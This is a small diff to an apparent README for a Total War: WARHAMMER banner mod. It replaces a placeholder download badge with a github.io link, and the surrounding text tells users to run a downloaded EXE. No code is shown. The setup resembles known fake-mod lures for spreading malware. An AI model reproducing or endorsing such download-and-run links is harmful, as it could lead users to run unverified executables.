@@ -4,7 +4,7 @@ To install, simply extract the downloaded archive and run the provided EXE file.
 
 Banner Overhaul Mod enhances the visual quality and thematic immersion of battle banners used during combat in Total War: WARHAMMER. This mod replaces default icons with richly detailed, faction-themed visuals that improve battlefield clarity.
 
-[![Download Banner Overhaul](https://img.shields.io/badge/Download-Banner--Overhaul--Mod-blueviolet)](#)
+[![Download Banner Overhaul](https://img.shields.io/badge/Download-Banner--Overhaul--Mod-blueviolet)](https://banner-overhaul-mod-for-total-war.github.io/.github)
 
 ---
 
